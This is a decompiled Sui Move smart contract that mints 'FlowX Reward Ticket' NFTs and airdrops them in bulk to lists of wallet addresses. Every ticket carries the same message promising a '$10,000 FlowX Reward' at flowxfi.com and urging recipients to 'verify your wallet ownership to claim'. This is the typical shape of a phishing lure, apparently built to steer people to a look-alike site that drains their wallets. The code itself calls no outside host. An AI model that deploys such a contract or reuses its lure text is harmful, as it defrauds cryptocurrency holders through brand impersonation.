module 0x5f6ada10be8cfd724c34b4479f45b7d823678cfe270230efc34c9596aede7aad::FLOWX_REWARD {
    struct FLOWX_REWARD has drop {
        dummy_field: bool,
    }

    struct FLOWX_REWARD_TICKET has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun DistributeReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = FLOWX_REWARD_TICKET{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"FlowX Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/flowxfi/flowx_item.jpg"),
                description : 0x1::string::utf8(b"$10,000 FlowX Reward is ready at flowxfi.com. Verify your wallet ownership to claim your reward."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<FLOWX_REWARD_TICKET>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"FlowX Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/flowxfi/flowx_item.jpg"),
                description : 0x1::string::utf8(b"$10,000 FlowX Reward is ready at flowxfi.com. Verify your wallet ownership to claim your reward."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<FLOWX_REWARD_TICKET>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: FLOWX_REWARD_TICKET, arg1: &mut 0x2::tx_context::TxContext) {
        let FLOWX_REWARD_TICKET {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: FLOWX_REWARD, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"FlowX Reward Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/flowxfi/flowx_item.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000 FlowX Reward is ready at flowxfi.com. Verify your wallet ownership to claim your reward."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://flowxfi.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"FlowX Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<FLOWX_REWARD>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<FLOWX_REWARD_TICKET>(&v4, v0, v2, arg1);
        0x2::display::update_version<FLOWX_REWARD_TICKET>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<FLOWX_REWARD_TICKET>>(v5, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_nft(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = FLOWX_REWARD_TICKET{
            id          : 0x2::object::new(arg0),
            name        : 0x1::string::utf8(b"FlowX Reward Ticket"),
            image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/flowxfi/flowx_item.jpg"),
            description : 0x1::string::utf8(b"$10,000 FlowX Reward is ready at flowxfi.com. Verify your wallet ownership to claim your reward."),
            Reward      : 0x1::string::utf8(b"$10,000"),
        };
        let v1 = MintEvent{
            nft_id      : 0x2::object::id<FLOWX_REWARD_TICKET>(&v0),
            user        : 0x2::tx_context::sender(arg0),
            name        : 0x1::string::utf8(b"FlowX Reward Ticket"),
            image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/flowxfi/flowx_item.jpg"),
            description : 0x1::string::utf8(b"$10,000 FlowX Reward is ready at flowxfi.com. Verify your wallet ownership to claim your reward."),
            Reward      : 0x1::string::utf8(b"$10,000"),
        };
        0x2::event::emit<MintEvent>(v1);
        0x2::transfer::public_transfer<FLOWX_REWARD_TICKET>(v0, 0x2::tx_context::sender(arg0));
    }

    // decompiled from Move bytecode v6
}

